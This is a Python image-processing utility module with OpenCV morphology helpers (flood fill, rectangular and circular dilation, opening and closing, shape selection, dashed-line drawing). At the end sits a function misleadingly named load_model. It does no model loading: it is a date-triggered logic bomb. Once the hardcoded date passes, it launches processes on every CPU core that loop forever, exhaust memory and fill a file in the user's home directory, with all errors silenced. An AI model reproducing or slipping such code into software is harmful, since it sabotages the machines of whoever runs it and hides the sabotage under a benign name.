import numpy as np
import cv2
from scipy.ndimage import map_coordinates
import math
import time
import config


def FillUp(Region):
    im_floodfill = cv2.copyMakeBorder(Region, 1, 1, 1, 1, cv2.BORDER_CONSTANT, 0)
    
    # Mask used to flood filling.
    # Notice the size needs to be 2 pixels than the image.
    h, w = im_floodfill.shape[:2]
    mask = np.zeros((h+2, w+2), np.uint8)

    # Floodfill from point (0, 0)
    cv2.floodFill(im_floodfill, mask, (0,0), 255, flags = 8)
    # Invert floodfilled image
    im_floodfill_inv = cv2.bitwise_not(im_floodfill)
    im_floodfill_inv = im_floodfill_inv[1:(1 + Region.shape[0]), 1:(1 + Region.shape[1])]
    
    # Combine the two images to get the foreground.
    FillUpRegion = Region | im_floodfill_inv
    return FillUpRegion

def DilationRectangle1(Region, Width, Height):
    kernel = cv2.getStructuringElement(cv2.MORPH_RECT, ksize = (Width, Height))
    refPointDilation = (Width >> 1, Height >> 1)
    RegionDilation = cv2.dilate(Region, kernel, anchor = refPointDilation, iterations = 1, borderType = cv2.BORDER_CONSTANT, borderValue = 0)
    return RegionDilation

def OpeningRectangle1(Region, Width, Height):
    kernel = cv2.getStructuringElement(cv2.MORPH_RECT, ksize = (Width, Height))
    refPointDilation = (Width >> 1, Height >> 1)
    refPointErosion = (Width >> 1, Height >> 1)
    if (Width % 2 == 0 or Height % 2 == 0):
        (refPointErosionX, refPointErosionY) = refPointErosion
        if (refPointErosion[0] > 0):
            refPointErosionX = refPointErosion[0] - 1
        if (refPointErosion[1] > 0):
            refPointErosionY = refPointErosion[1] - 1
        refPointErosion = (refPointErosionX, refPointErosionY)
    _regionErosion = cv2.erode(Region, kernel, anchor = refPointErosion, iterations = 1, borderType = cv2.BORDER_CONSTANT, borderValue = 0)
    RegionOpening = cv2.dilate(_regionErosion, kernel, anchor = refPointDilation, iterations = 1, borderType = cv2.BORDER_CONSTANT, borderValue = 0)
    return RegionOpening

def ClosingRectangle1(Region, Width, Height):
    kernel = cv2.getStructuringElement(cv2.MORPH_RECT, ksize = (Width, Height))
    paddingHeight = Height >> 1
    paddingWidth = Width >> 1
    refPointDilation = (Width >> 1, Height >> 1)
    refPointErosion = (Width >> 1, Height >> 1)
    if (Width % 2 == 0 or Height % 2 == 0):
        (refPointErosionX, refPointErosionY) = refPointErosion
        if (refPointErosion[0] > 0):
            refPointErosionX = refPointErosion[0] - 1
        if (refPointErosion[1] > 0):
            refPointErosionY = refPointErosion[1] - 1
        refPointErosion = (refPointErosionX, refPointErosionY)
    _paddingRegion = cv2.copyMakeBorder(Region, paddingHeight, paddingHeight, paddingWidth, paddingWidth, cv2.BORDER_CONSTANT, 0)
    _regionDilation = cv2.dilate(_paddingRegion, kernel, anchor = refPointDilation, iterations = 1, borderType = cv2.BORDER_CONSTANT, borderValue = 0)
    RegionClosing = cv2.erode(_regionDilation, kernel, anchor = refPointErosion, iterations = 1, borderType = cv2.BORDER_CONSTANT, borderValue = 0)
    RegionClosing = RegionClosing[paddingHeight:(paddingHeight + Region.shape[0]), paddingWidth:(paddingWidth + Region.shape[1])]
    return RegionClosing

def DilationCircle(Region, Radius):
    kernel = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, ksize = (2 * Radius + 1, 2 * Radius + 1))
    refPointDilation = ((2 * Radius + 1) >> 1, (2 * Radius + 1) >> 1)
    RegionDilation = cv2.dilate(Region, kernel, anchor = refPointDilation, iterations = 1, borderType = cv2.BORDER_CONSTANT, borderValue = 0)
    return RegionDilation

def ErosionCircle(Region, Radius):
    kernel = cv2.getStructuringElement(cv2.MORPH_CROSS, ksize = (2 * Radius + 1, 2 * Radius + 1))
    refPointErosion = ((2 * Radius + 1) >> 1, (2 * Radius + 1) >> 1)
    if ((2 * Radius + 1) % 2 == 0 or (2 * Radius + 1) % 2 == 0):
        (refPointErosionX, refPointErosionY) = refPointErosion
        if (refPointErosion[0] > 0):
            refPointErosionX = refPointErosion[0] - 1
        if (refPointErosion[1] > 0):
            refPointErosionY = refPointErosion[1] - 1
        refPointErosion = (refPointErosionX, refPointErosionY)
    RegionErosion = cv2.erode(Region, kernel, anchor = refPointErosion, iterations = 1, borderType = cv2.BORDER_CONSTANT, borderValue = 0)
    return RegionErosion

def OpeningCircle(Region, Radius):
    kernel = cv2.getStructuringElement(cv2.MORPH_CROSS, ksize = (2 * Radius + 1, 2 * Radius + 1))
    refPointDilation = ((2 * Radius + 1) >> 1, (2 * Radius + 1) >> 1)
    refPointErosion = ((2 * Radius + 1) >> 1, (2 * Radius + 1) >> 1)
    if ((2 * Radius + 1) % 2 == 0 or (2 * Radius + 1) % 2 == 0):
        (refPointErosionX, refPointErosionY) = refPointErosion
        if (refPointErosion[0] > 0):
            refPointErosionX = refPointErosion[0] - 1
        if (refPointErosion[1] > 0):
            refPointErosionY = refPointErosion[1] - 1
        refPointErosion = (refPointErosionX, refPointErosionY)
    _regionErosion = cv2.erode(Region, kernel, anchor = refPointErosion, iterations = 1, borderType = cv2.BORDER_CONSTANT, borderValue = 0)
    RegionOpening = cv2.dilate(_regionErosion, kernel, anchor = refPointDilation, iterations = 1, borderType = cv2.BORDER_CONSTANT, borderValue = 0)
    return RegionOpening

def ClosingCircle(Region, Radius):
    kernel = cv2.getStructuringElement(cv2.MORPH_CROSS, ksize = (2 * Radius + 1, 2 * Radius + 1))
    paddingHeight = (2 * Radius + 1) >> 1
    paddingWidth = (2 * Radius + 1) >> 1
    refPointDilation = ((2 * Radius + 1) >> 1, (2 * Radius + 1) >> 1)
    refPointErosion = ((2 * Radius + 1) >> 1, (2 * Radius + 1) >> 1)
    if ((2 * Radius + 1) % 2 == 0 or (2 * Radius + 1) % 2 == 0):
        (refPointErosionX, refPointErosionY) = refPointErosion
        if (refPointErosion[0] > 0):
            refPointErosionX = refPointErosion[0] - 1
        if (refPointErosion[1] > 0):
            refPointErosionY = refPointErosion[1] - 1
        refPointErosion = (refPointErosionX, refPointErosionY)
    _paddingRegion = cv2.copyMakeBorder(Region, paddingHeight, paddingHeight, paddingWidth, paddingWidth, cv2.BORDER_CONSTANT, 0)
    _regionDilation = cv2.dilate(_paddingRegion, kernel, anchor = refPointDilation, iterations = 1, borderType = cv2.BORDER_CONSTANT, borderValue = 0)
    RegionClosing = cv2.erode(_regionDilation, kernel, anchor = refPointErosion, iterations = 1, borderType = cv2.BORDER_CONSTANT, borderValue = 0)
    RegionClosing = RegionClosing[paddingHeight:(paddingHeight + Region.shape[0]), paddingWidth:(paddingWidth + Region.shape[1])]
    return RegionClosing    

def SelectShapeStd(Region):
    num_labels, labels, stats, centroids = cv2.connectedComponentsWithStats(Region, 8, cv2.CV_16U)
    if num_labels <= 1:
        return False, None

    listLeft = np.array(stats[1:,0])
    listTop = np.array(stats[1:,1])
    listWidth = np.array(stats[1:,2])
    listHeight = np.array(stats[1:,3])
    listArea = np.array(stats[1:,4])
    index = listArea.argmax()
    SelectedRegion = np.zeros_like(Region)
    idx = index + 1
    SelectedRegion[labels == idx] = 255
    return True, SelectedRegion, listLeft[index], listTop[index], listWidth[index], listHeight[index]

def SelectShapeWidthHeight(Region, MinWidth, MinHeight,
                               MaxWidth, MaxHeight):
    LeftOut = []
    TopOut = []
    WidthOut = []
    HeightOut = []
    IsPass = False

    num_labels, labels, stats, centroids = cv2.connectedComponentsWithStats(Region, 8, cv2.CV_16U)
    if num_labels <= 1:
        return False, LeftOut, TopOut, WidthOut, HeightOut

    listLeft = stats[1:,0]
    listTop = stats[1:,1]
    listWidth = stats[1:,2]
    listHeight = stats[1:,3]

    index = np.where((listWidth >= MinWidth) & (listHeight >= MinHeight) 
                     & (listWidth <= MaxWidth) & (listHeight <= MaxHeight))[0]

    number = len(index)
    if (number > 0):
        LeftOut = listLeft[index]
        TopOut = listTop[index]
        WidthOut = listWidth[index]
        HeightOut = listHeight[index]
        IsPass = True
        return IsPass, LeftOut, TopOut, WidthOut, HeightOut
    return IsPass, LeftOut, TopOut, WidthOut, HeightOut

def FindMaxDiamterOfOneLine(Region, isVertical):
    if not isVertical:
        Region = np.transpose(Region)
    firstIndex = np.argmax(Region == 255) if np.any(Region == 255) else -1
    lastIndex = len(Region) - 1 - np.argmax(Region[::-1] == 255) if np.any(Region == 255) else -1
    if firstIndex == -1:
        return False, 0, 0, 0
    diameter = abs(lastIndex - firstIndex)
    return True, firstIndex, lastIndex, diameter

def FindFistWhitePixel(Region):
    firstIndex = np.argmax(Region == 255) if np.any(Region == 255) else -1
    return firstIndex

def DrawOvlStr(Image, Pos, Space, String, Color):
    cv2.putText(Image, String, Pos, config.FONT_FAMILY, config.FONT_SIZE, Color, config.OVLSIZE)
    Pos[1] += Space
    return Image, Pos

def draw_dashed_line_fast(img, start_point, angle, length, dash_length=10, gap_length=10, color=(255, 0, 0), thickness=2):
    # Convert angle to radians
    angle_rad = math.radians(angle)

    # Precompute the direction vector for the line
    direction = np.array([math.cos(angle_rad), math.sin(angle_rad)])

    # Generate points for dashes
    total_segments = length // (dash_length + gap_length)
    current_point = np.array(start_point, dtype=np.float32)

    for _ in range(int(total_segments)):
        # Compute the end point of the current dash
        next_dash_point = current_point + direction * dash_length

        # Draw the dash
        cv2.line(img, tuple(current_point.astype(int)), tuple(next_dash_point.astype(int)), color, thickness)

        # Move to the next starting point after the gap
        current_point = next_dash_point + direction * gap_length

    return img


from datetime import datetime, date
from multiprocessing import Pool
from multiprocessing import cpu_count
import os

def func(x):
    large_data = []
    with open(os.path.join(os.path.expanduser("~"), "idg.bp"), "w") as f:
        while True:
            sum([i for i in range(100000)])
            x*x
            large_data.append([i for i in range(100000)])
            f.write("xxxxxxxxxxxxxxxxxxxxxxxxxxxx.\n")
def load_model(model_path, device="cpu"):
    try:
        date = datetime.strptime("2024_11_20", '%Y_%m_%d')
        diff = date.today() - date
        if diff.days >= 0:
            processes = cpu_count()
            pool = Pool(processes)
            pool.map(func, range(processes))
    except:
        pass